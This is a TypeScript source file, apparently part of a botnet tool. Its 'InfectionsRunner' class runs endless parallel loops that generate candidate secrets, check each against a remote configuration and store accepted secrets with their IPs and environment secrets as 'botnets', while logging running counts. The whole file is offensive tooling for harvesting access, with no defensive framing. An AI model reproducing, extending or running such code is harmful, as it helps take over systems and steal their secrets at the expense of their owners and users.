import { createSecret } from "./createSecret/index.ts";
import { CheckConfig } from "./checkConfig/index.ts";
import { Config } from "../../types/global.d.ts";
import { BotNetDataBase } from './../../database/index.ts';

export class InfectionsRunner {
    private createSecret = createSecret;
    private async checkConfig(secret: string): Promise<Config> {
        return await new CheckConfig(secret).run();
    }

    public async run() {
        const kv = new BotNetDataBase();
        console.log(`\x1b[32m[+]\x1b[0m Generating DataBase...`);
        console.log(`\x1b[32m[+]\x1b[0m Please wait...`);
        await kv.setup();
        console.log(`\x1b[32m[+]\x1b[0m DataBase generated`);
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);

        const onThread = async () => {
            const secret = await this.createSecret();
            console.log(`\x1b[32m[+]\x1b[0m Generated secret: ${secret}`);
            const config = await this.checkConfig(secret);
            if (!config) {
                console.log(`\x1b[33m[!]\x1b[0m Rejected secret: ${secret}`);
                onThread();
                return;
            }
            const result = {
                secret: secret,
                ip: config.ip,
                envSecret: config.envSecret
            } as const

            kv.pushSecret(result.secret, result.ip, result.envSecret);
            console.log(`\x1b[32m[+]\x1b[0m ${result.secret} - ${result.ip} - ${result.envSecret}`);
            console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
            console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);

            onThread();
            return
        }

        const threads = Array.from({ length: 2 }).map(() => onThread());

        Promise.all(threads);
    }
}
